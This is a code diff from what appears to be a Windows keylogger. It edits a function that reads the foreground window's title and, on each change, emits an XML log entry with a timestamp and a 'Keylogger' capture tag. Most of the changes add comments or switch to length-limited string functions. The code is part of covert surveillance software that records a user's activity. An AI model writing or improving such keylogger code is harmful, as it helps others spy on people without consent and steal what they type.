@@ -38,13 +38,37 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
 }
 
 FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
-{   int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
+{   /*
+        grab the length of the current foreground window title
+    */
+    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
+    /*
+        grab the text of the current foreground window and load it into
+        a secondary storage buffer for further processing.
+    */
     GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
-    if (strcmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY))
+    /*
+        limit the volume of xml statements by doing a comparison between the
+        current foreground window and the previously logged buffer.
+    */
+    if (strncmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH))
     {
-        strcpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY);
+        /*
+            a new title has been logged for the current foreground window.
+            copy the new title to the _GRAB_WINDOW_TITLE.
+        */
+        strncpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
+        /*
+            Generate a time stamp for this event.
+        */
         char *TimeStamp=asctime(localtime(&hms));
+        /*
+            set a null character to the end point of this buffer.
+        */
         TimeStamp[strlen(TimeStamp)-1]=0x00;
+        /*
+            generate the proper xml output for a change of title on a process.
+        */
         cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
         TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
     }
